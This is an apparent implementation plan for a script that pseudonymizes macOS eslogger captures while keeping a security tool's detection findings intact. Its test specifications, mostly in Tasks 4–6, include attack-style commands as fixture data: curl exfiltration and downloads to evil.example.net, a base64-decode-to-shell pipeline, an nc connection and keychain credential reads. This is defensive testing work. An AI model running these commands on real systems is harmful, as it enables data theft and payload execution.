# Capture Cleaner Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `scripts/gameleira-clean.sh` records (or reads) an eslogger capture and writes a pseudonymized copy whose Gameleira findings match the raw capture's, with a key of placeholders that stays on the Mac.

**Architecture:** A bash 3.2 script handles the command line, seeds, sudo/eslogger and the key file; one jq program in `scripts/gameleira-clean.jq` cleans the stream event by event, holding the placeholder table as `foreach` state. jq writes cleaned events to stdout and tagged side-channel lines (new key entries, final stats) to stderr, which `awk` routes to the key file, a stats file and the terminal. Vitest runs the script on fixtures, rebuilds the model and the rule engine from raw and cleaned output, and compares.

**Tech Stack:** bash 3.2 (macOS) / bash 5 (CI, ubuntu-latest), `/usr/bin/jq` 1.7.1 (macOS 15+, and preinstalled on GitHub's Ubuntu runners), awk, Vitest, the repo's model and rule engine.

**Spec:** `docs/superpowers/specs/2026-11-16-capture-cleaner-design.md`

## Global Constraints

- Nothing installed on the investigated Mac: bash 3.2, `/usr/bin/jq`, awk and stock macOS tools only. jq path overridable with `GAMELEIRA_CLEAN_JQ` (default `/usr/bin/jq`).
- Bash 3.2 compatible: no associative arrays, no `${x,,}`, no `mapfile`, no `|&`.
- Fail closed: a line that does not parse is dropped and counted, never copied, and no fragment of it reaches the output.
- Replacement is in place: an argument or environment entry is rewritten, never removed or split.
- Seeds, `-D` domains and a loaded key reach jq only through a `0600` file (`--slurpfile`), never jq's argv.
- Key file: created `0600` (`umask 077`) before any event is read; default `~/Library/Application Support/Gameleira/keys/<output basename>.key.tsv` (dir overridable with `GAMELEIRA_CLEAN_KEY_DIR`); header `kind	placeholder	real`; the `real` column is a JSON string literal so tabs and newlines survive; each line flushed when the placeholder is created.
- Placeholder forms: `userN`, `Person N`, `nameN` (keeping a leading dot and a 1–5 character extension of letters and digits), `volN`, `hostN.internal.invalid`, `personN@example.invalid`, `seedN`, `dataN`; numbered per kind from 1 in order of first appearance, continuing after a loaded key.
- Default output `capture.cleaned.jsonl` in the current folder; `-o FILE` creates the folder if needed.
- Recognised credentials become `<redacted>` and never reach the key.
- Argument errors exit 2, as in `gameleira-lab.sh`.
- Test hooks, all environment variables: `GAMELEIRA_CLEAN_NO_LOCAL_SEEDS=1` (skip `dscl`/`scutil`/`ioreg`), `GAMELEIRA_CLEAN_KEY_DIR`, `GAMELEIRA_CLEAN_FAKE_UID`, `GAMELEIRA_CLEAN_SOURCE_ONLY=1` (define functions, run nothing), `GAMELEIRA_CLEAN_JQ`.

## Review Focus

- **A name that appears before the program it names runs** (a dropper written to `~/Downloads/Zoom_Installer`, executed later). In `record` the earlier path already holds `nameN`; from the exec on, the name is kept. The findings must still match. Task 3 tests it in `clean -i` (where a prescan keeps it from the start) and in streaming order through stdin.
- **A home folder name with spaces, quotes or non-ASCII** (`/Users/jdoe/Documents/Board – Q3 "final"/x.pdf`) must give valid JSON and one consistent placeholder per name. Task 2 plants one.
- **An account short name that is also a common word or program** (`admin`, `dev`, `code`) must not rewrite `/dev`, `Code.app` or option names. Task 4 tests an account named `code` with `Visual Studio Code.app` and `/dev/null`.
- **A capture cut off mid-line** (Ctrl-C, disk full, a partial copy) must drop only the broken line and keep the key complete for everything written. Task 1 tests a truncated last line.
- **A cdhash, a hash-named cache file, a UUID folder or a bundle ID** must not be taken for `data` or a credential, or findings and readability suffer. Task 6 plants each.

---

### Task 1: Script skeleton, stream plumbing, key file and summary

No cleaning yet: this task builds the command line, the fail-closed stream, the side channel, the key file and the summary, and the test harness every later task uses.

**Files:**
- Create: `scripts/gameleira-clean.sh` (executable), `scripts/gameleira-clean.jq`
- Create: `test/clean-script.test.ts`, `test/clean-fixture.ts`
- Modify: `test/helpers.ts` (add `queueStatus`, `findingSignature`), `test/lab-script.test.ts` (import `queueStatus` from helpers instead of its local copy)

**Interfaces:**
- Produces, script: `gameleira-clean.sh clean -i RAW [-o FILE] [-k KEYFILE] [-D DOMAIN]... [-S SEEDFILE]` and `record [...] [-t SECONDS]` (Task 7). `-o -` writes the capture to stdout. Summary on stderr, one `name: value` per line, including `events in`, `events out`, `unreadable lines dropped`, `events dropped by Endpoint Security` (sum of `global_seq_num` gaps), `placeholders <kind>`, `redacted`, `capture`, `key`.
- Produces, shell functions (sourceable with `GAMELEIRA_CLEAN_SOURCE_ONLY=1`): `die MSG` (exit 1), `usage_error MSG` (exit 2), `write_config FILE` (writes the jq config JSON: `{seeds:[{kind,value}], domains:[string], key:[{kind,placeholder,real}], keep:[string]}`), `run_cleaner CONFIG KEYFILE STATSFILE` (stdin raw lines → stdout cleaned lines).
- Produces, jq program: reads raw lines (`-n -R`), generator `(inputs | {line: .}), {end: true}`, state `{map: {<kind>: {<real>: <placeholder>}}, next: {<kind>: int}, keep: {<name>: true}, stats: {...}, lastSeq: number|null}`. Side channel lines on stderr: `K\t<kind>\t<placeholder>\t<real as JSON>\n` and, once at the end, `S\t<stats JSON>\n`. A function `clean_event(state) -> {event, state, new: [entries]}` that later tasks extend; in this task it returns the event unchanged.
- Produces, test helpers: `runClean(args: string[], opts?: {input?: string, env?: Record<string,string>}) -> {out: string, key: string, summary: Record<string,string>, status: number}` (in `clean-script.test.ts`, using a fresh temp key dir per call unless `-k` is passed); `parseKey(tsv) -> {kind, placeholder, real}[]`; `queueStatus(a, p): 'queued'|'burst'|'in-chain'|'context'` (moved); `findingSignature(m: CaptureModel): Map<string, string[]>` keyed by process id (`pid:pidversion`) and persistence item id, values sorted `rule:severity:queue`.
- Produces, `test/clean-fixture.ts`: builders returning one eslogger JSONL line each, schema 11: `esProc({pid, pidversion?, path, uid?, euid?, signingId?, teamId?, platform?, ppid?})`, `esExec(proc, target, {args, cwd, env?, stdinPipe?, script?})`, `esFork(proc, child)`, `esCreate(proc, {path} | {dir, filename})`, `esRename(proc, from, to)`, `esBtm(proc, {itemUrl, executablePath, appUrl?, itemType})`, `esExit(proc)`; each takes an explicit `seq` so tests can make gaps.

- [ ] **Step 1: Write the failing tests** in `test/clean-script.test.ts`, `describe('plumbing')`; skip the file with `describe.skipIf(!fs.existsSync(JQ))`:
  - `an unknown argument exits 2`, `clean without -i exits 2`.
  - `every event comes out as JSON, one per line`: `clean -i test/fixtures/synthetic-lab.jsonl -o -` → same line count, each line parses.
  - `a broken line is dropped and counted, never copied`: input = 3 good lines + `{"event":{"exec":{"args":["SECRETFRAG` (truncated) + `not json SECRETFRAG2` + 1 good line → 4 lines out, summary `unreadable lines dropped: 2`, output has neither `SECRETFRAG`.
  - `a pretty-printed export and a JSON array are read`: the same events written as a pretty array and as pretty objects → identical output to the JSONL form.
  - `sequence gaps are reported`: seqs 1,2,5,6 → `events dropped by Endpoint Security: 2`.
  - `the key is 0600, in the key folder, with a header`: `fs.statSync(key).mode & 0o777` is `0o600`; first line `kind\tplaceholder\treal`.
  - `findingSignature of raw and cleaned synthetic-lab captures match` (trivially true now; it guards every later task).
- [ ] **Step 2: Run** `npx vitest run test/clean-script.test.ts` — expected FAIL (script missing).
- [ ] **Step 3: Implement the script and jq program.** `clean -i`: if the first non-blank line is exactly `{` or starts with `[`, normalize first with `jq -c 'if type=="array" then .[] else . end'`; if that normalizer fails, the summary says `input ended with a parse error`. jq runs with `-n -R -c --unbuffered -f gameleira-clean.jq --slurpfile cfg CONFIG`; its stderr goes through `2> >(awk ...)` that appends `K` lines (minus the tag) to the key with `fflush()`, writes the `S` line to the stats file, and passes anything else to the terminal's stderr. Config and stats files: `mktemp` under `umask 077`, removed on exit.
- [ ] **Step 4: Run** the test file and `npx vitest run test/lab-script.test.ts` — expected PASS.
- [ ] **Step 5: Commit** `feat: capture cleaner skeleton that streams, fails closed and keeps a key` (also add the spec and this plan with `git add -f`, since `docs/superpowers/specs` and `plans` are globally gitignored on this machine).

### Task 2: Placeholders, paths and kept names

**Files:** Modify `scripts/gameleira-clean.jq`, `test/clean-script.test.ts`, `test/clean-fixture.ts` (if a builder is missing).

**Interfaces:**
- Consumes: Task 1's state, side channel and `clean_event`.
- Produces, jq: `placeholder(kind; real) -> {ph, state}` (creates and records a `K` entry when new); `clean_path(path) -> path` cleaning name by name per the spec's *General string cleaning* step 1 and *Names that are kept*; `kept_name(name) -> bool`; `exec_names(event) -> [string]` (last component of every process `executable.path`, `exec.script.path`, `dyld_exec_path`, btm `executable_path`, `argv[0]`), added to `state.keep` before the event's strings are cleaned; `clean_string(s)` (paths inside strings, including `file://` URLs and `~/`) applied to every string by field walk, with the field exemptions of *Precedence* step 1; `new_path.filename` cleaned as the last name of `new_path.dir.path`; `create.acl` dropped.

- [ ] **Step 1: Write the failing tests**, `describe('paths')`, on a fixture built with `clean-fixture.ts` (user `jdoe`, uid 501):
  - `home, shared, volume and temp names become placeholders`: planted `Board – Q3 "final"`, `Q3-acquisition.pdf` under `~/Documents`, `Merger` under `~/Desktop`, `Offer.docx` under `~/Library/Application Support/Microsoft/Office/AutoRecovery`, a file under `~/Library/Group Containers/UBF8T346G9.Office/`, `/Users/Shared/Payroll.xlsx`, `/Volumes/Jdoe Passport/Clients/acme.pdf`, `/tmp/Board.key`, `/var/folders/ab/cdef/T/TemporaryItems/Notes.txt`, a create event with `dir` `~/Documents/Board` and `filename` `Minutes.pages` → none appear in the output; `jdoe`, `Jdoe Passport` absent; each appears in the key with kind `user`/`name`/`volume`.
  - `the same name gets the same placeholder in every field`: `Q3-acquisition.pdf` in a create path, an exec `cwd`, a plist URL and an argument → one `name` key entry, same `nameN.pdf` everywhere.
  - `shapes the rules need survive`: `Downloads`, `/Users/Shared/`, `~/Projects/.hidden/x` keeps `.nameN`, `node_modules`, `.git`, `Foo.app`, `~/Library/LaunchAgents/com.jdoe.agent.plist` → `~/Library/LaunchAgents/com.user1.agent.plist`, `/var/folders/ab/cdef/T/` kept, App Translocation path kept.
  - `programs that ran keep their names`: pipe into `/Users/jdoe/.pyenv/shims/python3`, `node` under `~/.nvm/versions/node/v22.0.0/bin/`, `/Users/jdoe/homebrew/bin/curl -o x`, `~/Downloads/Zoom_Installer` executed → `findingSignature` equal raw vs cleaned, and the names `python3`, `node`, `curl`, `Zoom_Installer` present.
  - `same findings`: `test/fixtures/synthetic-lab.jsonl` and `gameleira-lab.sh synthetic --stdout`, raw vs cleaned.
  - `same output every run` for the same input and a fresh key.
- [ ] **Step 2: Run** — expected FAIL.
- [ ] **Step 3: Implement** the functions above. Skip work on strings that cannot hold a path with one cheap `test("/")` before any `gsub`.
- [ ] **Step 4: Run** the clean and lab tests — expected PASS.
- [ ] **Step 5: Commit** `feat: the cleaner replaces personal path names and keeps the shapes rules need`.

### Task 3: Relative arguments, mapped names in text, key reuse and the prescan

**Files:** Modify `scripts/gameleira-clean.jq`, `scripts/gameleira-clean.sh`, `test/clean-script.test.ts`.

**Interfaces:**
- Consumes: `clean_path`, `placeholder`, `state.keep`.
- Produces: `in_cleaned_place(path) -> bool` (home, `/Users/Shared`, `/Volumes/<vol>`, temp folders); relative arguments and option values cleaned when the exec's `cwd` is in a cleaned place (option names and `argv[0]` untouched; `.`/`..`/leading dots/extensions kept); `replace_mapped(s)` replacing any already-mapped name of 4+ characters as a whole word or path component in any string; `-k` loading an existing key into `cfg.key` (placeholders continue numbering after it); `clean -i` prescan: one jq pass collecting `exec_names` into `cfg.keep` before cleaning.

- [ ] **Step 1: Write the failing tests**, `describe('arguments and text')`:
  - `relative arguments under a cleaned cwd are cleaned`: `zip -r board.zip "Q3 Financials"` with cwd `/Users/jdoe/Documents` → no `board`, no `Q3 Financials`; `-r` and `zip` intact; argument count unchanged.
  - `relative arguments under a kept cwd keep unknown names`: `ls Foo` with cwd `/usr/local` → `Foo` kept.
  - `a mapped name is replaced in free text`: `osascript -e 'tell app "Finder" to open "Q3-acquisition.pdf"'` after that file appeared in a path → placeholder in the text, `tell app "Finder"` intact.
  - `a name seen before its program ran`: create `~/Downloads/Zoom_Installer`, then exec it; via `clean -i` the name is kept everywhere; via stdin (`-i -`, no prescan) findings still match raw.
  - `two runs sharing a key give the same placeholders`: run A with `-k K`, run B with `-k K` on a second fixture sharing `jdoe` and `Q3-acquisition.pdf` → same `user1` and `nameN`, and new names numbered after A's.
- [ ] **Step 2: Run** — expected FAIL.
- [ ] **Step 3: Implement.** `clean -i -` reads stdin and skips the prescan.
- [ ] **Step 4: Run** — expected PASS.
- [ ] **Step 5: Commit** `feat: the cleaner follows names into relative arguments and free text`.

### Task 4: Seeds, account names and signing IDs

**Files:** Modify `scripts/gameleira-clean.jq`, `scripts/gameleira-clean.sh`, `test/clean-script.test.ts`.

**Interfaces:**
- Consumes: `cfg.seeds` from `write_config`.
- Produces: `-S SEEDFILE` read as `kind<TAB>value` lines into `cfg.seeds`, each given its placeholder up front (kinds `user`, `realname`, `host`, `seed`); `replace_seeds(s)` replacing seed values and account names case-insensitively as whole words outside option names and kept bundle/program names; names shorter than 4 characters only inside paths, emails and hosts; `signing_id` gets only account-name and seed replacement as whole dot/dash parts, never for `com.apple.*`; the summary line `short or common account names: <list>` when any account name is under 4 characters or in a small common-word list (`admin`, `user`, `test`, `dev`, `code`, `mac`, `guest`, `home`, `work`).

- [ ] **Step 1: Write the failing tests**, `describe('seeds')`, with `GAMELEIRA_CLEAN_NO_LOCAL_SEEDS=1` and a `-S` file:
  - `seeds are replaced anywhere`: full name `Jane Doe` in an `osascript` dialog text, computer name `Janes-MacBook-Pro` in an env value and a `scutil` argument, a serial in an `ioreg` argument → absent; key has `realname`, `host`, `seed`.
  - `signing IDs lose account names only`: `com.jdoe.tool` → `com.user1.tool`; `com.apple.jdoe-ish` untouched.
  - `an account named code does not rewrite Code.app, /dev or options`: user `code` → `/Users/user1/...` in paths; `Visual Studio Code.app`, `/dev/null`, `--code` intact; `shell-under-app` findings equal raw; summary lists `code`.
- [ ] **Step 2: Run** — expected FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — expected PASS.
- [ ] **Step 5: Commit** `feat: the cleaner replaces account names and machine seeds`.

### Task 5: Emails, internal hosts and URLs

**Files:** Modify `scripts/gameleira-clean.jq`, `scripts/gameleira-clean.sh`, `test/clean-script.test.ts`.

**Interfaces:**
- Consumes: `cfg.domains` (from repeatable `-D`), `placeholder`.
- Produces: `clean_emails(s)`; `is_internal_host(h) -> bool` (private and link-local IPv4 `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `127/8`; IPv6 `fc00::/7`, `fe80::/10`, `::1`; suffixes `.local`, `.internal`, `.corp`, `.lan`, `.home.arpa`; names under a `-D` domain; host seeds; single-label names in URLs and in `user@host:` forms); `clean_hosts(s)` for internal hosts anywhere; `clean_url(u)`: userinfo removed (counted as redacted), query values → `data` placeholders with names kept, path segments cleaned like names in a cleaned place, public host kept.

- [ ] **Step 1: Write the failing tests**, `describe('hosts')`:
  - `emails become placeholders`: `jane.doe@acme.com` in an argument and an env value → `person1@example.invalid` in both.
  - `internal hosts are cleaned anywhere`: `https://wiki.acme.com/x` with `-D acme.com`, `ssh build01.corp`, `git@git.acme.com:team/repo.git`, `nc 10.0.0.5 4444`, `HTTP_PROXY=http://proxy.lan:3128` → none present; `hostN.internal.invalid` in their place.
  - `public hosts stay, their URLs are cleaned`: `curl -o /tmp/p https://user:pw@evil.example.net/drop/Board.pdf?id=42&t=x` → `evil.example.net` kept, `user:pw` gone, `id=dataN&t=dataM`, `Board` gone; `download` finding equal raw.
- [ ] **Step 2: Run** — expected FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — expected PASS.
- [ ] **Step 5: Commit** `feat: the cleaner hides emails and internal hosts`.

### Task 6: Credentials, data and the environment

**Files:** Modify `scripts/gameleira-clean.jq`, `test/clean-script.test.ts`.

**Interfaces:**
- Consumes: `placeholder` (kind `data`), the field walk and its precedence.
- Produces: `redact_args(args, program) -> args` for the option-aware credentials of the spec's *Credentials* list; `redact_shapes(s)` for credential shapes (AWS `AKIA`/`ASIA` + 16, GitHub `ghp_`/`gho_`/`ghs_`/`github_pat_`, Slack `xox[abprs]-`, `sk-` keys, JWT `eyJ…\.…\.…`, PEM private key blocks); `map_data(args, program)` for `curl` `-d`/`--data*`/`--data-urlencode`/`-F`/`--form` values; `map_entropy(s)`: runs of 32+ base64/base64url/hex characters → `dataN`, except whole paths, file names, bundle IDs and exempt fields; `clean_env(env)`: names kept, values `<redacted>` except `PATH`, `SHELL`, `TMPDIR`, `HOME`, `PWD`, `OLDPWD`, `LANG`, `LC_*`, `TERM*`, `__CF*`, `DYLD_*`, which get `clean_string`; secret-looking names (`*PASSWORD*`, `*PASSWD*`, `*TOKEN*`, `*SECRET*`, `*API_KEY*`, `*AUTH*`, `*CREDENTIAL*`) always `<redacted>`. Order per *Precedence*: credentials, then data, then general cleaning.

- [ ] **Step 1: Write the failing tests**, `describe('secrets and data')`:
  - `credentials are redacted and never keyed`: `dscl . -authonly jdoe hunter2`, `security add-generic-password -a jdoe -s svc -w hunter3`, `curl -u bob:pw1 -H 'Authorization: Bearer tok9'`, `mysql -pSQLPW`, `openssl enc -pass pass:OPW`, `TOKEN=abc123xyz` argument, `AKIAABCDEFGHIJKLMNOP` and a JWT in args and env → none of the secrets in output or key; `<redacted>` in place; `Authorization:` header name kept; argument counts unchanged.
  - `the rules' flags survive`: `security find-generic-password -s "Chrome Safe Storage" -w` keeps `-w` and the service; `dscl-authonly`, `keychain-access` (high), `fake-prompt` and `payload-decode` findings equal raw.
  - `data is mapped in the key`: `curl -d 'q=Board+minutes' https://evil.example.net`, `sh -c 'echo <48 base64 chars> | base64 -d | sh'` → `dataN` in output, the real values (as JSON strings) in the key.
  - `hashes and IDs are not data`: a cdhash field, `~/Library/Caches/com.x/3f2a…(40 hex).db`, a UUID folder under `/var/folders`, `com.example.verylongbundleidentifiername.helper` → no `data` entries; findings equal raw.
  - `environment values are redacted, except the useful ones`: `AWS_SESSION_TOKEN`, `MY_VAR=Board`, `PATH=/Users/jdoe/bin:/usr/bin`, `DYLD_INSERT_LIBRARIES=/Users/jdoe/lib/x.dylib` → first two `<redacted>`, `PATH` and `DYLD_*` cleaned (`user1`).
- [ ] **Step 2: Run** — expected FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** the whole clean suite — expected PASS.
- [ ] **Step 5: Commit** `feat: the cleaner redacts credentials and keys data it cannot judge`.

### Task 7: Record mode and local seeds

**Files:** Modify `scripts/gameleira-clean.sh`, `test/clean-script.test.ts`.

**Interfaces:**
- Consumes: `run_cleaner`, `write_config`.
- Produces: `local_seeds` (accounts with uid ≥ 500 from `dscl . -list /Users UniqueID` and their `RealName`; `scutil --get ComputerName|LocalHostName|HostName`; `IOPlatformSerialNumber` and `IOPlatformUUID` from `ioreg -rd1 -c IOPlatformExpertDevice`), skipped when `GAMELEIRA_CLEAN_NO_LOCAL_SEEDS=1`; `record`: refuses as root (`GAMELEIRA_CLEAN_FAKE_UID`), refuses off macOS, `sudo -v`, then `sudo -n eslogger fork exec exit create rename unlink setextattr btm_launch_item_add btm_launch_item_remove | run_cleaner ...`, with `stop_capture` (SIGINT then SIGTERM to the sudo'd eslogger only, as in `gameleira-lab.sh`) on Ctrl-C or after `-t SECONDS`; `clean -i` warns `this capture's home folders name no account of this Mac; names outside paths are only caught with -S` when no `/Users/<name>/` in the first 1000 events matches a local account; the summary prints where the capture and the key are, and for `clean -i` that the raw file still exists.

- [ ] **Step 1: Write the failing tests**, `describe('record')`:
  - `record refuses to run as root` (`GAMELEIRA_CLEAN_FAKE_UID=0`), message matches `/not as root|without sudo/`.
  - `stopping the recorder lets the cleaner finish`: source the script, `SUDO_CMD=''`, a fake recorder (`( trap '' INT; while :; do cat fixture-line; sleep 0.05; done )`) piped through `run_cleaner`, `stop_capture` → recorder stopped within 15 s, every output line parses, key complete.
  - `clean -i warns about a capture from another Mac` (darwin only, without `GAMELEIRA_CLEAN_NO_LOCAL_SEEDS`): a fixture user `nobody-here-xyz` → warning on stderr, exit 0.
- [ ] **Step 2: Run** — expected FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — expected PASS. Then by hand on a Mac: `scripts/gameleira-clean.sh record -t 30 -o scratch/clean-test.jsonl`, run a few commands in another terminal, check the summary, open the capture in Gameleira, and grep it for your user name and computer name (expected: no hits).
- [ ] **Step 5: Commit** `feat: record mode cleans eslogger's stream before it reaches disk`.

### Task 8: Real captures, speed and the README

**Files:** Modify `test/clean-script.test.ts`, `README.md`.

- [ ] **Step 1: Write the tests**: `realDescribe('real captures')` — for each of `REAL_FIXTURES`, `findingSignature` raw vs cleaned equal, and `unreadable lines dropped: 0`.
- [ ] **Step 2: Run** — expected PASS where the captures are present; fix any difference in the jq program, adding a fixture case for it to the owning `describe`.
- [ ] **Step 3: Measure speed**: `time scripts/gameleira-clean.sh clean -i ../es-lab.jsonl -o /dev/null` and on `scratch/gameleira-lab-live.jsonl` and a `scripts/make-big.mjs` capture. Expected: at least 700 events per second. If well short, stop and bring the numbers to the user.
- [ ] **Step 4: Write the README section** after "Capturing", per the spec's *Docs* section: why, the two commands with `-D`/`-S`/`-k`/`-t`, what is replaced and what is kept, the key's location and that it holds real values (names, request bodies, payloads), must stay on the Mac, and that deleting it makes the cleaning irreversible; pseudonymized, not anonymous. Run `npx vitest run test/readme.test.ts` — expected PASS.
- [ ] **Step 5: Run** `npm test` — expected PASS. **Commit** `docs: describe the capture cleaner`.
